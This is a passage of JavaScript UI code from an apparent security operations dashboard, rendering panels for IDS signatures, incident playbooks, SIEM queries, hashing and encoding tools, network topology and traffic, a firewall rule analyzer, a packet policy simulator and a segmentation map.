            return '<div style="border-bottom:1px solid var(--line);padding:8px 0"><div style="font-weight:600;font-size:.72rem;color:var(--txt)">' + esc(s.msg) + ' <span style="color:var(--mut);font-weight:400">(SID:' + s.sid + ')</span></div><pre style="background:rgba(0,0,0,.3);padding:8px;border-radius:3px;font-size:.65rem;color:var(--acc);overflow-x:auto;margin:6px 0 0;white-space:pre-wrap">' + esc(s.rule) + '</pre></div>';
          }).join('') +
          '</div></div>';
      } else if (tab === 'playbooks') {
        dc.innerHTML = '<div class="ag-panel"><div class="ag-panel-h"><span style="color:var(--acc)">INCIDENT RESPONSE PLAYBOOKS</span><span style="flex:1"></span><span style="color:var(--mut)">' + IR_PLAYBOOKS.length + ' playbooks</span></div><div class="ag-panel-b">' +
          IR_PLAYBOOKS.map(function(p) {
            var svCls = p.severity === 'Critical' ? 'ag-crit' : p.severity === 'High' ? 'ag-high' : 'ag-med';
            return '<details style="border-bottom:1px solid var(--line);padding:8px 0"><summary style="cursor:pointer;display:flex;align-items:center;gap:8px"><span class="ag-badge ' + svCls + '">' + esc(p.severity) + '</span><span style="font-weight:600;font-size:.75rem">' + esc(p.name) + '</span></summary><ol style="margin:8px 0 0;padding-left:20px;font-size:.7rem;line-height:1.8;color:var(--mut)">' + p.steps.map(function(s) { return '<li>' + esc(s) + '</li>'; }).join('') + '</ol></details>';
          }).join('') +
          '</div></div>';
      } else if (tab === 'siemq') {
        var cats = [];
        SIEM_QUERIES.forEach(function(q) { if (cats.indexOf(q.category) < 0) cats.push(q.category); });
        var siemFilter = '';
        dc.innerHTML = '<div class="ag-panel"><div class="ag-panel-h"><span style="color:var(--acc)">SIEM QUERY LIBRARY</span><span style="flex:1"></span><span style="color:var(--mut)">' + SIEM_QUERIES.length + ' queries</span></div><div class="ag-panel-b">' +
          '<div style="display:flex;gap:4px;flex-wrap:wrap;margin-bottom:10px"><button class="ag-btn' + (!siemFilter ? '' : ' ag-btn-ghost') + '" data-sf="">All</button>' +
          cats.map(function(cat) { return '<button class="ag-btn ag-btn-ghost" data-sf="' + esc(cat) + '" style="font-size:.6rem;padding:4px 10px">' + esc(cat) + '</button>'; }).join('') + '</div>' +
          '<div id="ag-siemlist">' +
          SIEM_QUERIES.map(function(q) {
            return '<div class="ag-siem-entry" data-cat="' + esc(q.category) + '" style="border-bottom:1px solid var(--line);padding:10px 0">' +
              '<div style="display:flex;align-items:center;gap:8px;margin-bottom:6px"><span style="font-weight:600;font-size:.75rem;color:var(--txt)">' + esc(q.name) + '</span><span class="ag-badge ag-med" style="font-size:.55rem">' + esc(q.category) + '</span></div>' +
              '<div style="margin-bottom:4px"><span style="color:var(--acc);font-size:.6rem;font-weight:600">SPLUNK SPL</span></div>' +
              '<pre style="background:rgba(0,0,0,.3);padding:8px;border-radius:3px;font-size:.62rem;color:#00e5ff;overflow-x:auto;margin:0 0 8px;white-space:pre-wrap">' + esc(q.splunk) + '</pre>' +
              '<div style="margin-bottom:4px"><span style="color:#00e676;font-size:.6rem;font-weight:600">ELK KQL</span></div>' +
              '<pre style="background:rgba(0,0,0,.3);padding:8px;border-radius:3px;font-size:.62rem;color:#00e676;overflow-x:auto;margin:0;white-space:pre-wrap">' + esc(q.elk) + '</pre>' +
            '</div>';
          }).join('') +
          '</div></div>';
        dc.querySelectorAll('[data-sf]').forEach(function(b) {
          b.onclick = function() {
            siemFilter = b.dataset.sf;
            dc.querySelectorAll('[data-sf]').forEach(function(x) { x.classList.toggle('ag-btn-ghost', x.dataset.sf !== siemFilter); });
            dc.querySelectorAll('.ag-siem-entry').forEach(function(e) { e.style.display = (!siemFilter || e.dataset.cat === siemFilter) ? '' : 'none'; });
          };
        });
      }
    }
    renderDefContent(defTab);
    c.querySelectorAll('[data-dt]').forEach(function(b) {
      b.onclick = function() {
        defTab = b.dataset.dt;
        c.querySelectorAll('[data-dt]').forEach(function(x) { x.classList.toggle('ag-btn-ghost', x.dataset.dt !== defTab); });
        renderDefContent(defTab);
      };
    });
  }

  // ========== CRYPTO LAB ==========
  function renderCrypto(c) {
    c.innerHTML =
      '<div class="ag-panel">' +
        '<div class="ag-panel-h"><span style="color:var(--acc)">HASH GENERATOR</span></div>' +
        '<div class="ag-panel-b">' +
          '<input class="ag-inp" id="ag-hashin" placeholder="Enter text to hash...">' +
          '<button class="ag-btn" id="ag-hashgo" style="margin-top:8px">GENERATE HASHES</button>' +
          '<div id="ag-hashout" style="margin-top:8px"></div>' +
        '</div>' +
      '</div>' +
      '<div class="ag-panel" style="margin-top:10px">' +
        '<div class="ag-panel-h"><span style="color:var(--acc)">ENCODER / DECODER</span></div>' +
        '<div class="ag-panel-b">' +
          '<textarea class="ag-textarea" id="ag-encin" placeholder="Enter text to encode/decode..." rows="3"></textarea>' +
          '<div style="display:flex;gap:4px;margin-top:8px;flex-wrap:wrap">' +
            ['Base64 Encode','Base64 Decode','URL Encode','URL Decode','Hex Encode','Hex Decode','ROT13','HTML Encode','HTML Decode'].map(function(op) {
              return '<button class="ag-btn ag-btn-ghost" data-enc="' + op + '" style="font-size:.6rem;padding:4px 10px">' + op + '</button>';
            }).join('') +
          '</div>' +
          '<pre id="ag-encout" style="background:rgba(0,0,0,.3);padding:8px;border-radius:3px;font-size:.7rem;color:var(--acc);margin-top:8px;min-height:30px;white-space:pre-wrap;word-break:break-all"></pre>' +
        '</div>' +
      '</div>';

    c.querySelector('#ag-hashgo').onclick = function() {
      var text = c.querySelector('#ag-hashin').value;
      if (!text) return;
      var enc = new TextEncoder();
      var data = enc.encode(text);
      Promise.all([
        crypto.subtle.digest('SHA-1', data),
        crypto.subtle.digest('SHA-256', data),
        crypto.subtle.digest('SHA-384', data),
        crypto.subtle.digest('SHA-512', data),
      ]).then(function(hashes) {
        var hex = function(buf) { return Array.from(new Uint8Array(buf)).map(function(b) { return b.toString(16).padStart(2, '0'); }).join(''); };
        c.querySelector('#ag-hashout').innerHTML =
          '<table class="ag-tbl"><tbody>' +
          [['SHA-1', hex(hashes[0])],['SHA-256', hex(hashes[1])],['SHA-384', hex(hashes[2])],['SHA-512', hex(hashes[3])]].map(function(h) {
            return '<tr><td style="font-weight:600;color:var(--acc);width:80px">' + h[0] + '</td><td style="word-break:break-all;font-size:.65rem">' + h[1] + '</td></tr>';
          }).join('') +
          '</tbody></table>';
      });
    };

    c.querySelectorAll('[data-enc]').forEach(function(b) {
      b.onclick = function() {
        var inp = c.querySelector('#ag-encin').value;
        var out = c.querySelector('#ag-encout');
        var op = b.dataset.enc;
        try {
          if (op === 'Base64 Encode') out.textContent = btoa(unescape(encodeURIComponent(inp)));
          else if (op === 'Base64 Decode') out.textContent = decodeURIComponent(escape(atob(inp)));
          else if (op === 'URL Encode') out.textContent = encodeURIComponent(inp);
          else if (op === 'URL Decode') out.textContent = decodeURIComponent(inp);
          else if (op === 'Hex Encode') out.textContent = Array.from(new TextEncoder().encode(inp)).map(function(b) { return b.toString(16).padStart(2,'0'); }).join(' ');
          else if (op === 'Hex Decode') out.textContent = new TextDecoder().decode(new Uint8Array(inp.replace(/\s/g,'').match(/.{2}/g).map(function(h) { return parseInt(h,16); })));
          else if (op === 'ROT13') out.textContent = inp.replace(/[a-zA-Z]/g, function(c) { return String.fromCharCode(c.charCodeAt(0) + (c.toLowerCase() < 'n' ? 13 : -13)); });
          else if (op === 'HTML Encode') out.textContent = inp.replace(/[&<>"']/g, function(c) { return '&#' + c.charCodeAt(0) + ';'; });
          else if (op === 'HTML Decode') { var d = document.createElement('div'); d.innerHTML = inp; out.textContent = d.textContent; }
        } catch(e) { out.textContent = 'Error: ' + e.message; }
      };
    });
  }

  // ========== NETWORK OPERATIONS CENTER (NOC) ==========
  function renderNOC(c) {
    var nocTab = 'topology';
    c.innerHTML =
      '<div style="display:flex;gap:4px;margin-bottom:10px;flex-wrap:wrap">' +
        ['topology:Network Topology','traffic:Traffic Analysis','connections:Active Connections','anomalies:Anomaly Detection'].map(function(t) {
          var p = t.split(':');
          return '<button class="ag-btn' + (nocTab === p[0] ? '' : ' ag-btn-ghost') + '" data-nt="' + p[0] + '">' + p[1] + '</button>';
        }).join('') +
      '</div>' +
      '<div id="ag-noccontent"></div>';

    function renderNOCContent(tab) {
      var nc = c.querySelector('#ag-noccontent');
      if (tab === 'topology') {
        var statusColors = { online: '#00e676', warning: '#ffd600', critical: '#ff1744', offline: '#666' };
        var typeIcons = { firewall: 'FW', router: 'RTR', switch: 'SW', server: 'SRV', endpoint: 'EP' };
        nc.innerHTML =
          '<div class="ag-panel">' +
            '<div class="ag-panel-h"><span style="color:var(--acc)">NETWORK TOPOLOGY MAP</span><span style="flex:1"></span>' +
              '<span class="ag-badge ag-low" style="font-size:.5rem">ONLINE: ' + NOC_TOPOLOGY.filter(function(n){return n.status==='online'}).length + '</span>' +
              '<span class="ag-badge ag-med" style="font-size:.5rem">WARNING: ' + NOC_TOPOLOGY.filter(function(n){return n.status==='warning'}).length + '</span>' +
              '<span class="ag-badge ag-crit" style="font-size:.5rem">CRITICAL: ' + NOC_TOPOLOGY.filter(function(n){return n.status==='critical'}).length + '</span>' +
            '</div>' +
            '<div class="ag-panel-b" style="position:relative;height:540px;overflow:hidden;background:rgba(0,0,0,.2)">' +
              // Draw SVG lines for links
              '<svg style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none">' +
                NOC_LINKS.map(function(link) {
                  var fromNode = NOC_TOPOLOGY.find(function(n){return n.id === link.from});
                  var toNode = NOC_TOPOLOGY.find(function(n){return n.id === link.to});
                  if (!fromNode || !toNode) return '';
                  var util = link.used / link.bw;
                  var color = util > 0.8 ? '#ff1744' : util > 0.5 ? '#ffd600' : '#00e676';
                  return '<line x1="' + fromNode.x + '" y1="' + (fromNode.y + 20) + '" x2="' + toNode.x + '" y2="' + toNode.y + '" stroke="' + color + '" stroke-width="' + (util > 0.8 ? 2 : 1) + '" opacity="' + (0.3 + util * 0.5) + '"/>';
                }).join('') +
              '</svg>' +
              // Draw nodes
              NOC_TOPOLOGY.map(function(node) {
                var stColor = statusColors[node.status] || '#666';
                return '<div class="ag-topo-node" style="left:' + (node.x - 40) + 'px;top:' + node.y + 'px;background:rgba(0,0,0,.6);border-color:' + stColor + ';min-width:80px">' +
                  '<div style="color:' + stColor + ';font-size:.55rem;margin-bottom:2px">' + (typeIcons[node.type] || '?') + '</div>' +
                  '<div style="font-size:.52rem;color:var(--txt)">' + esc(node.label) + '</div>' +
                  '<div style="font-size:.48rem;color:var(--mut)">' + esc(node.ip) + '</div>' +
                  (node.cpu > 0 ? '<div style="font-size:.45rem;color:' + (node.cpu > 80 ? '#ff1744' : 'var(--mut)') + '">CPU:' + node.cpu + '% MEM:' + node.mem + '%</div>' : '') +
                '</div>';
              }).join('') +
            '</div>' +
          '</div>';
      } else if (tab === 'traffic') {
        nc.innerHTML =
          '<div class="ag-panel">' +
            '<div class="ag-panel-h"><span style="color:var(--acc)">BANDWIDTH UTILIZATION BY SEGMENT</span></div>' +
            '<div class="ag-panel-b">' +
              '<table class="ag-tbl"><thead><tr><th>Link</th><th>Protocol</th><th>Capacity</th><th>Used</th><th>Utilization</th><th>Status</th></tr></thead><tbody>' +
              NOC_LINKS.map(function(link) {
                var util = ((link.used / link.bw) * 100).toFixed(1);
                var utilColor = util > 80 ? '#ff1744' : util > 50 ? '#ffd600' : '#00e676';
                var fromNode = NOC_TOPOLOGY.find(function(n){return n.id === link.from});
                var toNode = NOC_TOPOLOGY.find(function(n){return n.id === link.to});
                return '<tr>' +
                  '<td style="font-size:.65rem">' + (fromNode ? esc(fromNode.label) : '') + ' -> ' + (toNode ? esc(toNode.label) : '') + '</td>' +
                  '<td style="color:var(--mut)">' + esc(link.proto) + '</td>' +
                  '<td style="font-variant-numeric:tabular-nums">' + (link.bw >= 10000 ? (link.bw/1000) + ' Gbps' : link.bw + ' Mbps') + '</td>' +
                  '<td style="font-variant-numeric:tabular-nums">' + (link.used >= 1000 ? (link.used/1000).toFixed(1) + ' Gbps' : link.used + ' Mbps') + '</td>' +
                  '<td><div style="display:flex;align-items:center;gap:4px"><div class="ag-health-bar" style="width:80px"><div class="ag-health-fill" style="width:' + Math.min(util,100) + '%;background:' + utilColor + '"></div></div><span style="color:' + utilColor + ';font-size:.62rem;font-weight:600">' + util + '%</span></div></td>' +
                  '<td><span class="ag-badge ' + (util > 80 ? 'ag-crit' : util > 50 ? 'ag-med' : 'ag-low') + '">' + (util > 80 ? 'OVERLOADED' : util > 50 ? 'ELEVATED' : 'NORMAL') + '</span></td>' +
                '</tr>';
              }).join('') +
              '</tbody></table>' +
            '</div>' +
          '</div>' +
          '<div class="ag-grid4" style="margin-top:10px">' +
            '<div class="ag-stat"><div class="ag-stat-v" style="color:var(--acc)">' + NOC_LINKS.length + '</div><div class="ag-stat-l">Active Links</div></div>' +
            '<div class="ag-stat"><div class="ag-stat-v" style="color:#ff1744">' + NOC_LINKS.filter(function(l){return l.used/l.bw > 0.8}).length + '</div><div class="ag-stat-l">Overloaded</div></div>' +
            '<div class="ag-stat"><div class="ag-stat-v" style="color:#00e676">' + (NOC_LINKS.reduce(function(s,l){return s+l.bw},0)/1000).toFixed(0) + ' Gbps</div><div class="ag-stat-l">Total Capacity</div></div>' +
            '<div class="ag-stat"><div class="ag-stat-v" style="color:#ffd600">' + (NOC_LINKS.reduce(function(s,l){return s+l.used},0)/1000).toFixed(1) + ' Gbps</div><div class="ag-stat-l">Total Used</div></div>' +
          '</div>';
      } else if (tab === 'connections') {
        nc.innerHTML =
          '<div class="ag-panel">' +
            '<div class="ag-panel-h"><span style="color:var(--acc)">ACTIVE CONNECTIONS</span><span style="flex:1"></span><span style="color:var(--mut)">' + NOC_CONNECTIONS.length + ' connections</span></div>' +
            '<div class="ag-panel-b">' +
              '<table class="ag-tbl"><thead><tr><th>Source</th><th>Destination</th><th>Protocol</th><th>Port</th><th>Bytes</th><th>State</th><th>Duration</th></tr></thead><tbody>' +
              NOC_CONNECTIONS.map(function(conn) {
                var isExternal = !conn.src.startsWith('10.') && !conn.src.startsWith('172.16.');
                var isSuspicious = isExternal || conn.state === 'SYN_RECV' || conn.state === 'SYN_SENT';
                return '<tr style="' + (isSuspicious ? 'background:rgba(255,23,68,.05)' : '') + '">' +
                  '<td style="font-size:.65rem;color:' + (isExternal ? '#ff1744' : 'var(--txt)') + '">' + esc(conn.src) + (isExternal ? ' <span style="color:#ff1744;font-size:.5rem">EXT</span>' : '') + '</td>' +
                  '<td style="font-size:.65rem">' + esc(conn.dst) + '</td>' +
                  '<td style="color:var(--acc)">' + esc(conn.proto) + '</td>' +
                  '<td>' + conn.port + '</td>' +
                  '<td style="font-variant-numeric:tabular-nums;color:var(--mut)">' + (conn.bytes > 1000000 ? (conn.bytes/1000000).toFixed(1) + ' MB' : (conn.bytes/1000).toFixed(0) + ' KB') + '</td>' +
                  '<td><span class="ag-badge ' + (conn.state === 'ESTABLISHED' ? 'ag-low' : conn.state === 'SYN_RECV' ? 'ag-crit' : conn.state === 'SYN_SENT' ? 'ag-high' : 'ag-med') + '">' + esc(conn.state) + '</span></td>' +
                  '<td style="color:var(--mut);font-size:.65rem">' + esc(conn.duration) + '</td>' +
                '</tr>';
              }).join('') +
              '</tbody></table>' +
            '</div>' +
          '</div>';
      } else if (tab === 'anomalies') {
        nc.innerHTML =
          '<div class="ag-panel">' +
            '<div class="ag-panel-h"><span style="color:#ff1744">ANOMALY DETECTION ALERTS</span><span style="flex:1"></span><span style="color:var(--mut)">' + NOC_ANOMALIES.length + ' alerts</span></div>' +
            '<div class="ag-panel-b">' +
              NOC_ANOMALIES.map(function(a) {
                var aCls = a.severity === 'Critical' ? 'ag-crit' : a.severity === 'High' ? 'ag-high' : a.severity === 'Medium' ? 'ag-med' : 'ag-low';
                return '<div style="border-bottom:1px solid var(--line);padding:10px 0">' +
                  '<div style="display:flex;align-items:center;gap:8px;margin-bottom:4px">' +
                    '<span class="ag-badge ' + aCls + '">' + esc(a.severity) + '</span>' +
                    '<span style="font-weight:600;font-size:.72rem;color:var(--txt)">' + esc(a.type) + '</span>' +
                    '<span style="flex:1"></span>' +
                    '<span style="color:var(--acc);font-size:.62rem">' + esc(a.mitre) + '</span>' +
                    '<span style="color:var(--mut);font-size:.62rem">' + esc(a.time) + '</span>' +
                  '</div>' +
                  '<div style="font-size:.68rem;color:var(--mut)"><span style="color:var(--txt)">Source:</span> ' + esc(a.src) + '</div>' +
                  '<div style="font-size:.68rem;color:var(--mut);margin-top:2px">' + esc(a.detail) + '</div>' +
                '</div>';
              }).join('') +
            '</div>' +
          '</div>';
      }
    }
    renderNOCContent(nocTab);
    c.querySelectorAll('[data-nt]').forEach(function(b) {
      b.onclick = function() {
        nocTab = b.dataset.nt;
        c.querySelectorAll('[data-nt]').forEach(function(x) { x.classList.toggle('ag-btn-ghost', x.dataset.nt !== nocTab); });
        renderNOCContent(nocTab);
      };
    });
  }

  // ========== FIREWALL RULE BASE ANALYZER ==========
  function fwSevCls(s) { return s === 'Critical' ? 'ag-crit' : s === 'High' ? 'ag-high' : s === 'Medium' ? 'ag-med' : s === 'Low' ? 'ag-low' : 'ag-info'; }

  function renderRuleBase(c) {
    var analysis = fwAnalyze();
    var flagged = analysis.filter(function (a) { return a.issues.length; });
    var count = function (t) { return analysis.filter(function (a) { return a.issues.some(function (i) { return i.type === t; }); }).length; };
    var permissive = analysis.filter(function (a) { return a.issues.some(function (i) { return i.type === 'Overly Permissive' || i.type === 'Broad Scope'; }); }).length;
    var shadowed = count('Shadowed');
    var redundant = count('Redundant');
    var risky = count('Risky Service');
    var disabled = FW_RULEBASE.filter(function (r) { return !r.enabled; }).length;
    c.innerHTML =
      '<div class="ag-grid4" style="margin-bottom:10px">' +
        '<div class="ag-stat"><div class="ag-stat-v" style="color:var(--acc)">' + FW_RULEBASE.length + '</div><div class="ag-stat-l">Total Rules</div></div>' +
        '<div class="ag-stat"><div class="ag-stat-v" style="color:' + (permissive ? '#ff1744' : '#00e676') + '">' + permissive + '</div><div class="ag-stat-l">Overly Permissive</div></div>' +
        '<div class="ag-stat"><div class="ag-stat-v" style="color:' + (shadowed ? '#ff9100' : '#00e676') + '">' + shadowed + '</div><div class="ag-stat-l">Shadowed / Unreachable</div></div>' +
        '<div class="ag-stat"><div class="ag-stat-v" style="color:' + (redundant ? '#ffd600' : '#00e676') + '">' + redundant + '</div><div class="ag-stat-l">Redundant</div></div>' +
        '<div class="ag-stat"><div class="ag-stat-v" style="color:' + (risky ? '#ff9100' : '#00e676') + '">' + risky + '</div><div class="ag-stat-l">Risky Services</div></div>' +
        '<div class="ag-stat"><div class="ag-stat-v" style="color:var(--mut)">' + disabled + '</div><div class="ag-stat-l">Disabled</div></div>' +
      '</div>' +
      '<div class="ag-panel">' +
        '<div class="ag-panel-h"><span style="color:var(--acc)">FIREWALL RULE BASE</span><span style="flex:1"></span><span style="color:var(--mut)">first-match-wins, evaluated top-down</span></div>' +
        '<div class="ag-panel-b" style="overflow-x:auto">' +
          '<table class="ag-tbl"><thead><tr><th>#</th><th>Name</th><th>Action</th><th>Source</th><th>Dest</th><th>Proto</th><th>Port</th><th>Hits</th><th>Analysis</th></tr></thead><tbody>' +
          analysis.map(function (a) {
            var r = a.rule;
            var worst = a.issues.reduce(function (m, i) { var ord = { Critical: 5, High: 4, Medium: 3, Low: 2, Info: 1 }; return ord[i.sev] > ord[m] ? i.sev : m; }, 'none');
            var rowBg = worst === 'Critical' ? 'background:rgba(255,23,68,.06)' : worst === 'High' ? 'background:rgba(255,145,0,.05)' : '';
            return '<tr style="' + rowBg + (r.enabled ? '' : ';opacity:.55') + '">' +
              '<td class="ag-fw-mono" style="color:var(--mut)">' + r.seq + '</td>' +
              '<td style="font-size:.66rem">' + esc(r.name) + '</td>' +
              '<td><span class="ag-badge ' + (r.action === 'allow' ? 'ag-low' : 'ag-crit') + '">' + esc(r.action) + '</span></td>' +
              '<td class="ag-fw-mono" style="font-size:.62rem">' + esc(r.src) + '</td>' +
              '<td class="ag-fw-mono" style="font-size:.62rem">' + esc(r.dst) + '</td>' +
              '<td style="color:var(--mut)">' + esc(r.proto) + '</td>' +
              '<td class="ag-fw-mono">' + esc(r.port) + '</td>' +
              '<td class="ag-fw-mono" style="color:var(--mut)">' + (r.hits ? r.hits.toLocaleString() : '0') + '</td>' +
              '<td>' + (a.issues.length ? a.issues.map(function (i) { return '<span class="ag-badge ' + fwSevCls(i.sev) + '" title="' + esc(i.msg) + '">' + esc(i.type) + '</span>'; }).join(' ') : '<span class="ag-badge ag-low">OK</span>') + '</td>' +
            '</tr>';
          }).join('') +
          '</tbody></table>' +
        '</div>' +
      '</div>' +
      '<div class="ag-panel">' +
        '<div class="ag-panel-h"><span style="color:#ff1744">FINDINGS DETAIL</span><span style="flex:1"></span><span style="color:var(--mut)">' + flagged.reduce(function (s, a) { return s + a.issues.length; }, 0) + ' issues across ' + flagged.length + ' rules</span></div>' +
        '<div class="ag-panel-b">' +
          (flagged.length ? flagged.map(function (a) {
            return a.issues.map(function (i) {
              return '<div class="ag-fw-diag" style="border-left-color:' + (i.sev === 'Critical' ? '#ff1744' : i.sev === 'High' ? '#ff9100' : i.sev === 'Medium' ? '#ffd600' : '#00e5ff') + '">' +
                '<span class="ag-badge ' + fwSevCls(i.sev) + '">' + esc(i.sev) + '</span> ' +
                '<span style="color:var(--txt);font-weight:600">#' + a.rule.seq + ' ' + esc(a.rule.name) + '</span> &mdash; ' +
                '<span style="color:var(--acc)">' + esc(i.type) + ':</span> <span style="color:var(--mut)">' + esc(i.msg) + '</span>' +
              '</div>';
            }).join('');
          }).join('') : '<div style="color:var(--mut);font-size:.72rem">No issues detected.</div>') +
        '</div>' +
      '</div>';
  }

  // ========== POLICY SIMULATOR ("would this packet be allowed?") ==========
  function renderPolicySim(c) {
    c.innerHTML =
      '<div class="ag-panel">' +
        '<div class="ag-panel-h"><span style="color:var(--acc)">PACKET POLICY SIMULATOR</span><span style="flex:1"></span><span style="color:var(--mut)">evaluated against ' + FW_RULEBASE.filter(function (r) { return r.enabled; }).length + ' enabled rules</span></div>' +
        '<div class="ag-panel-b">' +
          '<div class="ag-grid4">' +
            '<div><div class="ag-stat-l" style="margin-bottom:3px">Source IP</div><input class="ag-inp" id="ag-sim-src" value="185.220.101.34"></div>' +
            '<div><div class="ag-stat-l" style="margin-bottom:3px">Destination IP</div><input class="ag-inp" id="ag-sim-dst" value="10.0.20.1"></div>' +
            '<div><div class="ag-stat-l" style="margin-bottom:3px">Protocol</div><select class="ag-sel" id="ag-sim-proto" style="width:100%"><option value="tcp">TCP</option><option value="udp">UDP</option><option value="any">ANY</option></select></div>' +
            '<div><div class="ag-stat-l" style="margin-bottom:3px">Dest Port</div><input class="ag-inp" id="ag-sim-port" value="443"></div>' +
          '</div>' +
          '<div style="display:flex;gap:6px;margin-top:10px;flex-wrap:wrap">' +
            '<button class="ag-btn" id="ag-sim-run">EVALUATE PACKET</button>' +
            ['185.220.101.34>10.0.20.1:443:tcp:External to web HTTPS','10.0.300.90>10.0.30.1:5432:tcp:Dev to DB (Postgres)','10.0.100.55>8.8.8.8:53:udp:Workstation DNS out','45.33.32.100>10.0.10.1:22:tcp:External SSH to DC'].map(function (p, k) {
              return '<button class="ag-btn ag-btn-ghost" data-preset="' + esc(p.split(':').slice(0, 4).join(':')) + '">' + esc(p.split(':')[4]) + '</button>';
            }).join('') +
          '</div>' +
          '<div id="ag-sim-result" style="margin-top:12px"></div>' +
        '</div>' +
      '</div>';

    function runSim() {
      var src = (c.querySelector('#ag-sim-src').value || '').trim();
      var dst = (c.querySelector('#ag-sim-dst').value || '').trim();
      var proto = c.querySelector('#ag-sim-proto').value;
      var port = (c.querySelector('#ag-sim-port').value || '').trim();
      var res = fwSimulate({ src: src, dst: dst, proto: proto, port: port });
      var allow = res.action === 'allow';
      var srcZone = fwZoneOf(src), dstZone = fwZoneOf(dst);
      // Build per-rule evaluation trace up to and including the match
      var trace = [];
      for (var i = 0; i < FW_RULEBASE.length; i++) {
        var r = FW_RULEBASE[i];
        var reached = res.matched ? i <= res.index : true;
        if (!reached) break;
        if (!r.enabled) { trace.push({ r: r, state: 'skip', note: 'disabled' }); continue; }
        var mSrc = fwIpInCidr(src, r.src), mDst = fwIpInCidr(dst, r.dst), mProto = fwProtoMatch(r.proto, proto), mPort = fwPortMatch(r.port, port);
        var hit = mSrc && mDst && mProto && mPort;
        trace.push({ r: r, state: hit ? 'match' : 'nomatch', note: hit ? '' : [!mSrc ? 'src' : '', !mDst ? 'dst' : '', !mProto ? 'proto' : '', !mPort ? 'port' : ''].filter(Boolean).join(',') + ' mismatch' });
        if (hit) break;
      }
      c.querySelector('#ag-sim-result').innerHTML =
        '<div class="ag-panel" style="border-color:' + (allow ? '#00e676' : '#ff1744') + '">' +
          '<div class="ag-panel-h" style="color:' + (allow ? '#00e676' : '#ff1744') + '">VERDICT: ' + (allow ? 'ALLOW' : 'DENY') + '</div>' +
          '<div class="ag-panel-b" style="font-size:.72rem">' +
            '<div style="margin-bottom:6px">' + esc(src) + ' <span style="color:var(--mut)">[' + esc(srcZone.name) + ']</span> &rarr; ' + esc(dst) + ' <span style="color:var(--mut)">[' + esc(dstZone.name) + ']</span> ' + esc(proto.toUpperCase()) + '/' + esc(port) + '</div>' +
            (res.matched ?
              '<div>Matched rule <span style="color:var(--acc)">#' + res.rule.seq + ' ' + esc(res.rule.name) + '</span> after evaluating ' + res.evaluated + ' rule(s).</div>' +
              (res.rule.src === 'any' && res.rule.dst === 'any' && res.rule.action === 'allow' ? '<div style="color:#ff1744;margin-top:4px">WARNING: permitted only by a broad any-any rule &mdash; segmentation is being bypassed.</div>' : '')
              : '<div style="color:#ff1744">' + esc(res.reason) + '</div>') +
          '</div>' +
        '</div>' +
        '<div class="ag-panel"><div class="ag-panel-h"><span style="color:var(--acc)">EVALUATION TRACE</span></div><div class="ag-panel-b">' +
          trace.map(function (t) {
            var col = t.state === 'match' ? '#00e676' : t.state === 'skip' ? 'var(--mut)' : 'var(--mut)';
            var tag = t.state === 'match' ? (t.r.action === 'allow' ? 'MATCH / ALLOW' : 'MATCH / DENY') : t.state === 'skip' ? 'SKIP' : 'no match';
            return '<div class="ag-fw-diag" style="border-left-color:' + (t.state === 'match' ? (t.r.action === 'allow' ? '#00e676' : '#ff1744') : 'var(--line)') + '">' +
              '<span class="ag-fw-mono" style="color:var(--mut)">#' + t.r.seq + '</span> ' + esc(t.r.name) +
              ' <span style="color:' + col + '">[' + tag + ']</span>' + (t.note ? ' <span style="color:var(--mut);font-size:.62rem">(' + esc(t.note) + ')</span>' : '') +
            '</div>';
          }).join('') +
        '</div></div>';
    }

    c.querySelector('#ag-sim-run').onclick = runSim;
    c.querySelectorAll('[data-preset]').forEach(function (b) {
      b.onclick = function () {
        var p = b.dataset.preset.split(':'); // src>dst : port : proto  (src>dst combined first)
        var sd = p[0].split('>');
        c.querySelector('#ag-sim-src').value = sd[0];
        c.querySelector('#ag-sim-dst').value = sd[1];
        c.querySelector('#ag-sim-port').value = p[1];
        c.querySelector('#ag-sim-proto').value = p[2];
        runSim();
      };
    });
    runSim();
  }

  // ========== NETWORK SEGMENTATION MAP ==========
  function renderSegmentation(c) {
    var zones = FW_ZONES;
    // Node inventory per zone from live topology
    var inv = {};
    zones.forEach(function (z) { inv[z.id] = []; });
    NOC_TOPOLOGY.forEach(function (n) { var z = fwZoneOf(n.ip); inv[z.id].push(n.label); });
    // Zone-to-zone reachability from rule base
    function cellPolicy(a, b) {
      var specific = 0, broad = 0, deny = 0;
      FW_RULEBASE.forEach(function (r) {
        if (!r.enabled) return;
        if (!(fwCidrOverlap(r.src, a.cidr) && fwCidrOverlap(r.dst, b.cidr))) return;
        var isBroad = fwParseCidr(r.src).any && fwParseCidr(r.dst).any;
        if (r.action === 'allow') { if (isBroad) broad++; else specific++; }
        else if (!isBroad) deny++;
      });
      if (specific > 0) return { v: 'ALLOW', bg: 'rgba(0,230,118,.15)', fg: '#00e676', n: specific };
      if (broad > 0) return { v: 'OPEN', bg: 'rgba(255,23,68,.18)', fg: '#ff1744', n: broad };
      if (deny > 0) return { v: 'DENY', bg: 'rgba(255,145,0,.10)', fg: '#ff9100', n: deny };
      return { v: '-', bg: 'transparent', fg: 'var(--mut)', n: 0 };
    }
    var srcZones = zones, dstZones = zones;
    var openCells = 0;
    var matrix = srcZones.map(function (a) {
      return { zone: a, cells: dstZones.map(function (b) { var cp = cellPolicy(a, b); if (cp.v === 'OPEN') openCells++; return cp; }) };
    });
    // Observed cross-zone flows that violate segmentation intent
    var violations = NOC_CONNECTIONS.map(function (conn) {
      var za = fwZoneOf(conn.src), zb = fwZoneOf(conn.dst);
      var res = fwSimulate({ src: conn.src, dst: conn.dst, proto: fwTransport(conn.port, conn.proto), port: conn.port });
      var broadOnly = res.matched && res.rule.action === 'allow' && fwParseCidr(res.rule.src).any && fwParseCidr(res.rule.dst).any;
      var external = za.id === 'ext';
      var crossSensitive = za.id !== zb.id && (zb.id === 'dc' || zb.id === 'db' || zb.id === 'mgmt');
      var reason = res.action === 'deny' ? 'blocked by policy but observed active' : broadOnly ? 'permitted only by broad any-any rule' : external ? 'external ingress into internal zone' : crossSensitive ? 'cross-segment access to sensitive zone' : '';
      return { conn: conn, za: za, zb: zb, res: res, reason: reason, broadOnly: broadOnly, external: external };
    }).filter(function (x) { return x.reason; });

    c.innerHTML =
      '<div class="ag-grid4" style="margin-bottom:10px">' +
        '<div class="ag-stat"><div class="ag-stat-v" style="color:var(--acc)">' + zones.length + '</div><div class="ag-stat-l">Defined Zones</div></div>' +
        '<div class="ag-stat"><div class="ag-stat-v" style="color:var(--txt)">' + NOC_TOPOLOGY.length + '</div><div class="ag-stat-l">Mapped Assets</div></div>' +
